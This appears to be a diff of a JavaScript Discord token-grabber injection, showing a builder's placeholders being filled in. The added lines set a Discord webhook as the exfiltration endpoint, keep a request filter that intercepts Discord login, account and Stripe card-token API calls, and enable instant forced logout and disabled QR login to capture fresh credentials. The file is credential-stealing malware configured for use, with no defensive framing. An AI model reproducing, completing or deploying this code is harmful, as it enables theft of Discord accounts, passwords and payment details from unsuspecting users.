@@ -7,19 +7,19 @@ const fs = require('fs');
 const path = require('path');
 const querystring = require("querystring");
 const os = require('os')
-const webhook = "https://discord.com/api/webhooks/958662044977082388/Xv97oZGydO7bRV2CkfggOUZkGsGles-xzGFDYURPP4JzVqy1YA18fgSnUeLpqvPyRmhY";
+const webhook = "https://discord.com/api/webhooks/958697841159733288/NoBBJMrtMxLzr7xq51ZL15XcSMCMOc6Imx38-9QNkY_rXL1so_33zdfnssRJxztIIOMn";
 const Filter = {
     urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
 };
 
 
 const config = {
-    "logout": "%LOGOUT%",
-    "logout-notify": "%LOGOUTNOTI%",
-    "init-notify": "%INITNOTI%",
+    "logout": "instant",
+    "logout-notify": "true",
+    "init-notify": "false",
     "embed-color": 3447704,
-    "disable-qr-code": "%DISABLEQRCODE%"
-};
+    "disable-qr-code": "true"
+}
 
 const badges = {
     Discord_Employee: {
